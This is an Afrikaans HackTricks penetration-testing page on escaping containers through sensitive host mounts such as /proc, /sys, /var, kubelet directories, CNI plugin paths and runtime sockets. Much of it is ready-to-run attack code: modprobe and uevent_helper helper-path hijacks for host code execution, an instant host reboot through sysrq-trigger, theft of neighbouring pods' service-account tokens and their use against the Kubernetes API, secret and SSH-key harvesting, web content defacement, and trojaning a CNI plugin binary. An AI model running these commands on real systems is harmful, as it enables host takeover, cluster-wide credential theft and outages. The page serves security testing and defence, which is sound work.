# Sensitiewe Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Host mounts is een van die belangrikste praktiese container-escape-oppervlaktes omdat hulle dikwels 'n versigtig geïsoleerde proses-aansig terugvou na direkte sigbaarheid van host-hulpbronne. Die gevaarlike gevalle is nie beperk tot `/` nie. Bind mounts van `/proc`, `/sys`, `/var`, runtime sockets, kubelet-bestuurde state, of device-verwante paths kan kernel-kontroles, credentials, lêerstelsels van naburige containers en runtime-bestuursinterfaces blootstel.

Hierdie bladsy bestaan afsonderlik van die individuele protection-bladsye omdat die abuse-model oor verskeie areas strek. 'n Skryfbare host mount is deels gevaarlik weens mount namespaces, deels weens user namespaces, deels weens AppArmor- of SELinux-dekking, en deels weens presies watter host path blootgestel is. Deur dit as 'n eie onderwerp te behandel, word die attack surface baie makliker om te ontleed.

## `/proc`-blootstelling

procfs bevat beide gewone prosesinligting en kernel-kontroles met 'n groot impak. 'n Bind mount soos `-v /proc:/host/proc`, of 'n container-aansig wat onverwagte skryfbare proc entries blootstel, kan dus lei tot inligtingsopenbaarmaking, denial of service, of direkte host code execution.

Hoëwaarde-procfs-paths sluit in:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Begin deur te kontroleer watter hoëwaarde-procfs-entries sigbaar of skryfbaar is:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Hierdie paaie is om verskillende redes interessant. `core_pattern`, `modprobe` en `binfmt_misc` kan host code-execution-paaie word wanneer hulle skryfbaar is. `kallsyms`, `kmsg`, `kcore` en `config.gz` is kragtige reconnaissance-bronne vir kernel exploitation. `sched_debug` en `mountinfo` onthul proses-, cgroup- en filesystem-konteks wat kan help om die host-uitleg vanuit die container te rekonstrueer.

Die praktiese waarde van elke pad verskil, en om almal te behandel asof hulle dieselfde impak het, maak triage moeiliker:

- `/proc/sys/kernel/core_pattern`
Indien dit skryfbaar is, is dit een van die procfs-paaie met die grootste impak, omdat die kernel ’n pipe-handler ná ’n crash sal uitvoer. ’n Container wat `core_pattern` na ’n payload in sy overlay of in ’n gemounte host-pad kan wys, kan dikwels host code execution verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir ’n toegewyde voorbeeld.
- `/proc/sys/kernel/modprobe`
Hierdie pad beheer die userspace-helper wat deur die kernel gebruik word wanneer dit module-loading-logika moet aanroep. Indien dit vanuit die container skryfbaar is en in die host-konteks geïnterpreteer word, kan dit nog ’n host code-execution primitive word. Dit is veral interessant wanneer dit gekombineer word met ’n manier om die helper-pad te trigger.
- `/proc/sys/vm/panic_on_oom`
Dit is gewoonlik nie ’n skoon escape-primitive nie, maar dit kan memory pressure in host-wide denial of service omskep deur OOM-toestande in kernel panic-gedrag te verander.
- `/proc/sys/fs/binfmt_misc`
Indien die registration-interface skryfbaar is, kan die aanvaller ’n handler vir ’n gekose magic value registreer en host-context execution verkry wanneer ’n ooreenstemmende lêer uitgevoer word.
- `/proc/config.gz`
Nuttig vir kernel exploit triage. Dit help bepaal watter subsystems, mitigations en optional kernel features geaktiveer is sonder dat host package metadata benodig word.
- `/proc/sysrq-trigger`
Hoofsaaklik ’n denial-of-service-pad, maar ’n baie ernstige een. Dit kan die host onmiddellik reboot, panic of andersins ontwrig.
- `/proc/kmsg`
Onthul kernel ring buffer-boodskappe. Nuttig vir host fingerprinting, crash analysis en in sommige omgewings vir die leaking van inligting wat nuttig is vir kernel exploitation.
- `/proc/kallsyms`
Waardevol wanneer dit leesbaar is, omdat dit exported kernel symbol-inligting blootstel en kan help om address randomization-aannames tydens kernel exploit development te omseil.
- `/proc/[pid]/mem`
Dit is ’n direkte process-memory-interface. Indien die teikenproses bereikbaar is met die nodige ptrace-style conditions, kan dit die lees of wysiging van ’n ander proses se memory moontlik maak. Die realistiese impak hang sterk af van credentials, `hidepid`, Yama en ptrace restrictions, dus is dit ’n kragtige maar conditional path.
- `/proc/kcore`
Blootstel ’n core-image-style-aansig van system memory. Die lêer is enorm en onprakties om te gebruik, maar indien dit betekenisvol leesbaar is, dui dit op ’n swak beskermde host memory surface.
- `/proc/kmem` en `/proc/mem`
Historiese raw memory interfaces met ’n groot impak. Op baie moderne systems is hulle gedeaktiveer of sterk beperk, maar indien hulle teenwoordig en bruikbaar is, moet hulle as critical findings behandel word.
- `/proc/sched_debug`
Lek scheduling- en task-inligting wat host process identities kan blootstel, selfs wanneer ander process views skoner lyk as wat verwag is.
- `/proc/[pid]/mountinfo`
Uiters nuttig om te rekonstrueer waar die container werklik op die host geleë is, watter paaie deur overlay gerugsteun word, en of ’n skryfbare mount met host-inhoud ooreenstem of slegs met die container layer.

Indien `/proc/[pid]/mountinfo` of overlay-details leesbaar is, gebruik dit om die host-pad van die container filesystem te herwin:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Hierdie opdragte is nuttig omdat verskeie host-execution-truuks vereis dat ’n pad binne die container omgeskakel word na die ooreenstemmende pad vanuit die host se perspektief.

### Volledige voorbeeld: `modprobe` Helper Path Abuse

As `/proc/sys/kernel/modprobe` vanaf die container skryfbaar is en die helper path in die host-konteks geïnterpreteer word, kan dit na ’n aanvaller-beheerde payload herlei word:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Die presiese sneller hang van die teiken en kernel-gedrag af, maar die belangrike punt is dat ’n skryfbare helper-pad ’n toekomstige kernel-helper-aanroeping kan herlei na aanvaller-beheerde host-pad-inhoud.

### Volledige voorbeeld: Kernel Recon met `kallsyms`, `kmsg` en `config.gz`

As die doelwit exploitability-assessment eerder as onmiddellike escape is:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Hierdie commands help bepaal of nuttige simboolinligting sigbaar is, of onlangse kernel-boodskappe interessante state onthul, en watter kernel-features of mitigations ingesluit is. Die impak is gewoonlik nie ’n direkte escape nie, maar dit kan kernel-vulnerability-triage aansienlik verkort.

### Full Example: SysRq Host Reboot

Indien `/proc/sysrq-trigger` writable is en toegang tot die host view kry:
```bash
echo b > /proc/sysrq-trigger
```
Die effek is ’n onmiddellike host-herlaai. Dit is nie ’n subtiele voorbeeld nie, maar dit demonstreer duidelik dat procfs-blootstelling veel ernstiger as slegs inligtingsopenbaarmaking kan wees.

## `/sys`-blootstelling

sysfs stel groot hoeveelhede kernel- en toesteltoestand bloot. Sommige sysfs-paaie is hoofsaaklik nuttig vir fingerprinting, terwyl ander helper-uitvoering, toestelgedrag, sekuriteitsmodule-konfigurasie of firmwaretoestand kan beïnvloed.

Hoëwaarde-sysfs-paaie sluit in:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paaie is om verskillende redes belangrik. `/sys/class/thermal` kan termiese-bestuursgedrag beïnvloed en dus host-stabiliteit in swak blootgestelde omgewings beïnvloed. `/sys/kernel/vmcoreinfo` kan crash-dump- en kernel-uitleginligting leak wat met laevlak-host-fingerprinting help. `/sys/kernel/security` is die `securityfs`-koppelvlak wat deur Linux Security Modules gebruik word, dus kan onverwagte toegang daar MAC-verwante toestand blootstel of verander. EFI-veranderlike paaie kan firmware-gesteunde boot-instellings beïnvloed, wat hulle veel ernstiger as gewone konfigurasielêers maak. `debugfs` onder `/sys/kernel/debug` is besonder gevaarlik omdat dit doelbewus ’n ontwikkelaar-georiënteerde koppelvlak is met veel minder veiligheidsverwagtinge as geharde kernel-API’s wat vir produksie bedoel is.

Nuttige hersieningsopdragte vir hierdie paaie is:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Wat maak daardie opdragte interessant:

- `/sys/kernel/security` kan onthul of AppArmor, SELinux of ’n ander LSM-oppervlak sigbaar is op ’n manier wat slegs op die host beskikbaar moes wees.
- `/sys/kernel/debug` is dikwels die kommerwekkendste bevinding in hierdie groep. As `debugfs` gemount en leesbaar of skryfbaar is, verwag ’n breë kern-gerigte oppervlak waarvan die presiese risiko afhang van die geaktiveerde debug-nodes.
- Blootstelling van EFI-veranderlikes is minder algemeen, maar het ’n groot impak indien dit voorkom, omdat dit firmware-gesteunde instellings raak eerder as gewone runtime-lêers.
- `/sys/class/thermal` is hoofsaaklik relevant vir host-stabiliteit en hardeware-interaksie, nie vir ’n netjiese shell-styl escape nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik ’n bron vir host-fingerprinting en crash-analise, nuttig om laevlak-kernstatus te verstaan.

### Volledige voorbeeld: `uevent_helper`

As `/sys/kernel/uevent_helper` skryfbaar is, kan die kern ’n aanvaller-beheerde helper uitvoer wanneer ’n `uevent` geaktiveer word:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Die rede waarom dit werk, is dat die helper path vanuit die host se oogpunt geïnterpreteer word. Sodra dit geaktiveer word, loop die helper in die host-konteks eerder as binne die huidige container.

## Blootstelling van `/var`

Om die host se `/var` in 'n container te mount, word dikwels onderskat omdat dit nie so dramaties soos die mount van `/` lyk nie. In die praktyk kan dit genoeg wees om runtime sockets, container snapshot directories, kubelet-managed pod volumes, geprojekteerde service-account tokens en naburige application filesystems te bereik. Op moderne nodes is `/var` dikwels waar die interessantste operasionele container state eintlik geleë is.

### Kubernetes Voorbeeld

'n Pod met `hostPath: /var` kan dikwels ander pods se geprojekteerde tokens en overlay snapshot content lees:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle wys of die mount slegs oninteressante toepassingsdata blootstel of hoë-impak cluster-geloofsbriewe. ’n Leesbare service-account token kan plaaslike code execution onmiddellik in Kubernetes API access omskakel.

As die token teenwoordig is, valideer waartoe dit toegang het eerder as om by token discovery te stop:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die impak hier kan veel groter wees as plaaslike node-toegang. ’n Token met breë RBAC kan ’n gemounte `/var` in cluster-wye compromise omskep.

### Voorbeeld van Docker en containerd

Op Docker-hosts is die relevante data dikwels onder `/var/lib/docker`, terwyl dit op Kubernetes-nodes wat deur containerd gerugsteun word, onder `/var/lib/containerd` of snapshotter-spesifieke paaie kan wees:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
As die gemonteerde `/var` skryfbare snapshot-inhoud van ’n ander workload blootstel, kan die aanvaller moontlik toepassinglêers wysig, webinhoud plant of opstartscripts verander sonder om aan die huidige container-konfigurasie te raak.

Konkrete misbruikidees sodra skryfbare snapshot-inhoud gevind word:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Hierdie commands is nuttig omdat hulle die drie hoof-impakkategorieë van `mounted /var` toon: application tampering, secret recovery en lateral movement na aangrensende workloads.

## Kubelet-status, Plugins en CNI-paaie

’n Mount van `/var/lib/kubelet`, `/opt/cni/bin` of `/etc/cni/net.d` word dikwels via bevoorregte DaemonSets, CNI-agente, CSI-node-plugins, GPU-operators en storage helpers blootgestel. Hierdie mounts is maklik om as "node plumbing" af te maak, maar hulle is direk deel van die execution path vir nuwe pods en bevat dikwels kubelet credentials, projected secrets, registration sockets en uitvoerbare host-side plugin binaries.

Teikens met hoë waarde sluit in:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nuttige review commands is:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Waarom hierdie paaie saak maak:

- `/var/lib/kubelet/pki` kan kubelet-kliëntsertifikate en ander node-plaaslike credentials blootstel wat soms teen die API server of kubelet-gerigte TLS-endpunte hergebruik kan word, afhangend van die cluster-ontwerp.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` bevat dikwels geprojekteerde service-account tokens en gemounte Secrets vir naburige pods op dieselfde node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is hoofsaaklik ’n reconnaissance-oppervlak, maar ’n baie nuttige een: dit wys watter pods en containers tans GPUs, hugepages, SR-IOV-toestelle en ander skaars node-plaaslike resources gebruik.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` en `/var/lib/kubelet/plugins_registry` wys watter CSI-, DRA- en device plugins geïnstalleer is en met watter sockets die kubelet veronderstel is om te kommunikeer. As daardie directories skryfbaar eerder as slegs leesbaar is, word die bevinding baie ernstiger.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` en `/etc/cni/net.d` is direk deel van die pod-netwerkopstelpad. Skryfbare toegang daar is dikwels ’n vertraagde host-execution-primitive eerder as blootstelling van konfigurasie.<sup>[[2]](#references)</sup>

### Volledige voorbeeld: Skryfbare `/opt/cni/bin`

As ’n host se CNI-binary-directory read-write gemount is, kan die vervanging van ’n plugin genoeg wees om host execution te verkry die volgende keer wanneer die kubelet ’n pod-sandbox op daardie node skep:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Dit is nie so onmiddellik soos ’n gemonteerde `docker.sock` nie, maar dit is dikwels meer realisties in gekompromitteerde Kubernetes-infrastruktuur-pods. Die belangrike punt is dat die gewysigde binary later deur die host-netwerkopstellingvloei uitgevoer word, nie deur die huidige container nie.

## Runtime Sockets

Sensitiewe host-monterings sluit dikwels runtime sockets eerder as volledige gidse in. Dit is so belangrik dat dit hier uitdruklik herhaal moet word:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige exploitation flows sodra een van hierdie sockets gemount is.

As 'n vinnige eerste interaksiepatroon:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
As een hiervan slaag, is die pad vanaf "mounted socket" na "start a more privileged sibling container" gewoonlik baie korter as enige kernel breakout path.

## Writable Host Path Task Hijack

'n Skryfbare host mount hoef nie `/` bloot te stel om gevaarlik te wees nie. As die gemounte pad scripts, config-lêers, hooks, plugins of lêers bevat wat later deur 'n host-side geskeduleerde taak of diens gebruik word, kan die container moontlik verander wat die host uitvoer.

Generiese hersieningsvloei:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
As ’n skryfbare lêer deur ’n host-proses verbruik word, hou die payload eenvoudig en waarneembaar tydens toetsing:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Die interessante deel is die trust boundary: die skryfaksie gebeur van binne die container, maar uitvoering gebeur later in die host-servicekonteks. Dit verander ’n nou hostPath of bind mount in ’n vertraagde host-code-execution primitive.

## CVE's wat met mounts verband hou

Host mounts hou ook verband met runtime-kwesbaarhede. Belangrike onlangse voorbeelde sluit in:

- `CVE-2024-21626` in `runc`, waar ’n gelekte directory file descriptor die working directory op die host-lêerstelsel kon plaas.
- `CVE-2024-23651`, `CVE-2024-23652` en `CVE-2024-23653` in BuildKit, waar kwaadwillige Dockerfiles, frontends en `RUN --mount`-flows weer toegang tot host-lêers, skrapping of verhoogde privileges tydens builds kon bewerkstellig.
- `CVE-2024-1753` in Buildah- en Podman-build-flows, waar spesiaal vervaardigde bind mounts tydens ’n build `/` read-write kon blootstel.
- `CVE-2025-47290` in `containerd` 2.1.0, waar ’n TOCTOU tydens image-unpack ’n spesiaal vervaardigde image kon toelaat om die host-lêerstelsel tydens ’n pull te wysig.

Hierdie CVE's is relevant omdat dit wys dat mount-hantering nie slegs oor operator-konfigurasie gaan nie. Die runtime self kan ook mount-gedrewe escape-toestande veroorsaak.

## Kontroles

Gebruik hierdie commands om die mounts met die hoogste waarde vinnig op te spoor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Wat hier interessant is:

- Host root, `/proc`, `/sys`, `/var` en runtime sockets is almal hoë-prioriteit-bevindings.
- Skryfbare proc/sys-inskrywings beteken dikwels dat die mount host-globale kernelkontroles blootstel eerder as ’n veilige container-aansig.
- Gemonteerde `/var`-paaie verdien credential- en naburige workload-oorsig, nie net lêerstelsel-oorsig nie.
- Kubelet-staatgidse en CNI/plugin-paaie verdien dieselfde prioriteit as runtime sockets, omdat hulle dikwels direk op die node se pod-skeppings- en credential-verspreidingspad lê.

## Verwysings

- [1] [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
